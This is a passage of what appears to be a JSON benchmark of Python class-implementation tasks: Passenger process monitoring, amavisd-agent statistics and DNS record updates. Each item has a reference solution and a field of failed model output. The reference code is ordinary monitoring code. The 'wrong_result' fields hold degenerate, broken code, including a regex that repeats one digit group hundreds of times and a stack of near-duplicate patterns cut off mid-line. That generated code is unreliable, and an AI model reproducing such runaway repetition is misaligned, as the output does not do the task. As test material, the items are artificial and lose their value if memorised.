conditions:\n            records = [record for record in records if all(record.get(key) == value for key, value in conditions.items())]\n        return records\n\n    def update_record(self, domain, value, record_type=\"A\"):\n        did = self.get_domain_id(domain)\n        name, subdomain = self.get_domain_info(domain)\n        records = self.get_records(did, name=name, type=record_type)\n        if records:\n            record = records[0]\n            record[\"value\"] = value\n            record[\"ttl\"] = self.TTL\n            return self.request(\"Record.Modify\", did, **record)\n        else:\n            return self.request(\"Record.Create\", did, name=name, type=record_type, line=self.DEFAULT, value=value, ttl=self.TTL)\n```\n"
  },
  {
    "Task_id": 301,
    "Instruction": "Task Description: Implement a class to monitor and collect statistics about Passenger application server processes, including memory usage, CPU usage, and queue statistics.\n\nClass Description: The PassengerProcessCommunicator class is designed to interact with Passenger application server processes to gather various performance metrics. It uses subprocess communication to execute system commands and parse their outputs.\n\nAttributes:\n- config: [dict] - A configuration dictionary containing settings like command paths and sudo usage flags.\n\nMethods:\n- get_passenger_memory_stats() -> [dict] - Collects memory statistics for Apache, Nginx, and Passenger processes. Returns a dictionary with process lists and total memory usage.\n- get_passenger_cpu_usage(dict_stats: dict) -> [float] - Calculates total CPU usage percentage for all Passenger-related processes. Takes a dictionary of process stats and returns the total CPU usage.\n- get_passenger_queue_stats() -> [dict] - Gathers queue statistics from Passenger status, including top-level and application queue sizes. Returns a dictionary with queue metrics.",
    "Canonical_solution": "import subprocess\nimport re\nimport os\nfrom diamond.collector import str_to_bool\n\nclass PassengerProcessCommunicator:\n    def __init__(self, config):\n        self.config = config\n\n    def get_passenger_memory_stats(self):\n        command = [self.config[\"passenger_memory_stats_bin\"]]\n        if str_to_bool(self.config[\"use_sudo\"]):\n            command.insert(0, self.config[\"sudo_cmd\"])\n\n        try:\n            proc1 = subprocess.Popen(command, stdout=subprocess.PIPE)\n            (std_out, std_err) = proc1.communicate()\n        except OSError:\n            return {}\n\n        if std_out is None:\n            return {}\n\n        dict_stats = {\n            \"apache_procs\": [],\n            \"nginx_procs\": [],\n            \"passenger_procs\": [],\n            \"apache_mem_total\": 0.0,\n            \"nginx_mem_total\": 0.0,\n            \"passenger_mem_total\": 0.0,\n        }\n        \n        re_colour = re.compile(\"\\x1B\\[([0-9]{1,3}((;[0-9]{1,3})*)?)?[m|K]\")\n        re_digit = re.compile(\"^\\d\")\n        \n        apache_flag = 0\n        nginx_flag = 0\n        passenger_flag = 0\n        for raw_line in std_out.splitlines():\n            line = re_colour.sub(\"\", raw_line)\n            if \"Apache processes\" in line:\n                apache_flag = 1\n            elif \"Nginx processes\" in line:\n                nginx_flag = 1\n            elif \"Passenger processes\" in line:\n                passenger_flag = 1\n            elif re_digit.match(line):\n                line_splitted = line.split()\n                if apache_flag == 1:\n                    dict_stats[\"apache_procs\"].append(line_splitted[0])\n                    dict_stats[\"apache_mem_total\"] += float(line_splitted[4])\n                elif nginx_flag == 1:\n                    dict_stats[\"nginx_procs\"].append(line_splitted[0])\n                    dict_stats[\"nginx_mem_total\"] += float(line_splitted[4])\n                elif passenger_flag == 1:\n                    dict_stats[\"passenger_procs\"].append(line_splitted[0])\n                    dict_stats[\"passenger_mem_total\"] += float(line_splitted[3])\n            elif \"Processes:\" in line:\n                passenger_flag = 0\n                apache_flag = 0\n                nginx_flag = 0\n\n        return dict_stats\n\n    def get_passenger_cpu_usage(self, dict_stats):\n        try:\n            proc1 = subprocess.Popen(\n                [\"top\", \"-b\", \"-n\", \"2\"],\n                stdout=subprocess.PIPE)\n            (std_out, std_err) = proc1.communicate()\n        except OSError:\n            return -1\n\n        re_lspaces = re.compile(\"^\\s*\")\n        re_digit = re.compile(\"^\\d\")\n        overall_cpu = 0\n        for raw_line in std_out.splitlines():\n            line = re_lspaces.sub(\"\", raw_line)\n            if not re_digit.match(line):\n                continue\n\n            line_splitted = line.split()\n            if line_splitted[0] in dict_stats[\"apache_procs\"]:\n                overall_cpu += float(line_splitted[8])\n            elif line_splitted[0] in dict_stats[\"nginx_procs\"]:\n                overall_cpu += float(line_splitted[8])\n            elif line_splitted[0] in dict_stats[\"passenger_procs\"]:\n                overall_cpu += float(line_splitted[8])\n\n        return overall_cpu\n\n    def get_passenger_queue_stats(self):\n        queue_stats = {\n            \"top_level_queue_size\": 0.0,\n            \"passenger_queue_size\": 0.0,\n        }\n\n        command = [self.config[\"passenger_status_bin\"]]\n        if str_to_bool(self.config[\"use_sudo\"]):\n            command.insert(0, self.config[\"sudo_cmd\"])\n\n        try:\n            proc1 = subprocess.Popen(command, stdout=subprocess.PIPE)\n            (std_out, std_err) = proc1.communicate()\n        except OSError:\n            return {}\n\n        if std_out is None:\n            return {}\n\n        re_colour = re.compile(\"\\x1B\\[([0-9]{1,3}((;[0-9]{1,3})*)?)?[m|K]\")\n        re_requests = re.compile(r\"Requests\")\n        re_topqueue = re.compile(r\"^top-level\")\n\n        gen_info_flag = 0\n        app_groups_flag = 0\n        for raw_line in std_out.splitlines():\n            line = re_colour.sub(\"\", raw_line)\n            if \"General information\" in line:\n                gen_info_flag = 1\n            if \"Application groups\" in line:\n                app_groups_flag = 1\n            elif re_requests.match(line) and re_topqueue.search(line):\n                line_splitted = line.split()\n                if gen_info_flag == 1 and line_splitted:\n                    queue_stats[\"top_level_queue_size\"] = float(line_splitted[5])\n            elif re_requests.search(line) and not re_topqueue.search(line):\n                line_splitted = line.split()\n                if app_groups_flag == 1 and line_splitted:\n                    queue_stats[\"passenger_queue_size\"] = float(line_splitted[3])\n\n        return queue_stats",
    "Code_level": "Class-level",
    "FSMID_for_test": 76,
    "wrong_result": "```python\nimport subprocess\nimport re\nfrom typing import Dict, List, Union\n\nclass PassengerProcessCommunicator:\n    def __init__(self, config: Dict):\n        self.config = config\n\n    def get_passenger_memory_stats(self) -> Dict:\n        memory_stats = {}\n        for process in ['apache', 'nginx', 'passenger']:\n            cmd = self.config['command_paths'][process]['memory']\n            if self.config['sudo']:\n                cmd = ['sudo'] + cmd\n            output = subprocess.check_output(cmd).decode('utf-8')\n            memory_stats[process] = self.parse_memory_stats(output)\n        return memory_stats\n\n    def get_passenger_cpu_usage(self, dict_stats: Dict) -> float:\n        total_cpu_usage = 0\n        for process, stats in dict_stats.items():\n            total_cpu_usage += stats['cpu_usage']\n        return total_cpu_usage\n\n    def get_passenger_queue_stats(self) -> Dict:\n        cmd = self.config['command_paths']['passenger']['queue']\n        if self.config['sudo']:\n            cmd = ['sudo'] + cmd\n        output = subprocess.check_output(cmd).decode('utf-8')\n        return self.parse_queue_stats(output)\n\n    def parse_memory_stats(self, output: str) -> Dict:\n        memory_stats = {}\n        memory_stats['processes'] = re.findall(r'(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s+(\\d+)\\s"
  },
  {
    "Task_id": 303,
    "Instruction": "Task Description: Create a Python class that collects and parses statistics from the amavisd-agent program using subprocess communication.\n\nClass Description: The AmavisCollector class is designed to interface with the amavisd-agent program to collect mail processing statistics. It uses subprocess.PIPE to communicate with the agent process and regular expressions to parse the output. The class supports optional sudo execution for privilege escalation.\n\nAttributes:\n\nmatchers: [List[re.Pattern]] - A list of compiled regular expressions used to parse different formats of statistics from amavisd-agent output.\nconfig: [Dict[str, Any]] - Configuration dictionary containing paths to executables and sudo settings.\n\nMethods:\n\n__init__: [Name](amavisd_exe: str = '/usr/sbin/amavisd-agent', use_sudo: bool = False, sudo_exe: str = '/usr/bin/sudo', sudo_user: str = 'amavis') -> None - Initializes the collector with configuration parameters for the amavisd-agent executable and optional sudo settings.\ncollect: [Name]() -> Generator[Tuple[str, str, str], None, None] - Executes the amavisd-agent process, captures its output, and yields parsed statistics as tuples of (metric_name, metric_type, value). Raises an exception if the process cannot be executed.",
    "Canonical_solution": "import os\nimport subprocess\nimport re\n\nclass AmavisCollector:\n    matchers = [\n        re.compile(r'^\\s*(?P<name>[\\w]+)\\s+(?P<time>[\\d]+) s\\s+'\n                   r'(?P<frequency>[\\d.]+) s/msg\\s+\\([\\w]+\\)\\s*$'),\n        re.compile(r'^\\s*(?P<name>[\\w.-]+)\\s+(?P<count>[\\d]+)\\s+'\n                   r'(?P<frequency>[\\d.]+)/h\\s+(?P<percentage>[\\d.]+) %'\n                   r'\\s\\([\\w]+\\)\\s*$'),\n        re.compile(r'^\\s*(?P<name>[\\w.-]+)\\s+(?P<size>[\\d]+)MB\\s+'\n                   r'(?P<frequency>[\\d.]+)MB/h\\s+(?P<percentage>[\\d.]+) %'\n                   r'\\s\\([\\w]+\\)\\s*$'),\n    ]\n\n    def __init__(self, amavisd_exe='/usr/sbin/amavisd-agent', use_sudo=False, sudo_exe='/usr/bin/sudo', sudo_user='amavis'):\n        self.config = {\n            'amavisd_exe': amavisd_exe,\n            'use_sudo': use_sudo,\n            'sudo_exe': sudo_exe,\n            'sudo_user': sudo_user\n        }\n\n    def collect(self):\n        try:\n            if self.config['use_sudo']:\n                cmdline = [\n                    self.config['sudo_exe'], '-u', self.config['sudo_user'],\n                    '--', self.config['amavisd_exe'], '-c', '1'\n                ]\n            else:\n                cmdline = [self.config['amavisd_exe'], '-c', '1']\n                \n            agent = subprocess.Popen(cmdline, stdout=subprocess.PIPE)\n            agent_out = agent.communicate()[0]\n            lines = agent_out.strip().split(os.linesep)\n            \n            for line in lines:\n                for rex in self.matchers:\n                    res = rex.match(line)\n                    if res:\n                        groups = res.groupdict()\n                        name = groups['name']\n                        for metric, value in groups.items():\n                            if metric == 'name':\n                                continue\n                            yield (name, metric, value)\n\n        except OSError as err:\n            raise Exception(f\"Could not run {self.config['amavisd_exe']}: {err}\")",
    "Code_level": "Class-level",
    "FSMID_for_test": 76,
    "wrong_result": "```python\nimport re\nimport subprocess\nfrom typing import Any, Dict, Generator, List, Tuple\n\n\nclass AmavisCollector:\n    def __init__(self, amavisd_exe: str = '/usr/sbin/amavisd-agent', use_sudo: bool = False, sudo_exe: str = '/usr/bin/sudo', sudo_user: str = 'amavis') -> None:\n        self.matchers = [\n            re.compile(r'(\\w+): (\\w+) (\\d+)'),\n            re.compile(r'(\\w+): (\\w+) (\\d+) (\\d+)'),\n            re.compile(r'(\\w+): (\\w+) (\\d+) (\\d+) (\\d+)'),\n            re.compile(r'(\\w+): (\\w+) (\\d+) (\\d+) (\\d+) (\\d+)'),\n            re.compile(r'(\\w+): (\\w+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+)'),\n            re.compile(r'(\\w+): (\\w+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+)'),\n            re.compile(r'(\\w+): (\\w+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+)'),\n            re.compile(r'(\\w+): (\\w+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+)'),\n            re.compile(r'(\\w+): (\\w+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+) (\\d+)'),\n            re.compile(r'(\\w+): (\\w+) (\\d+) 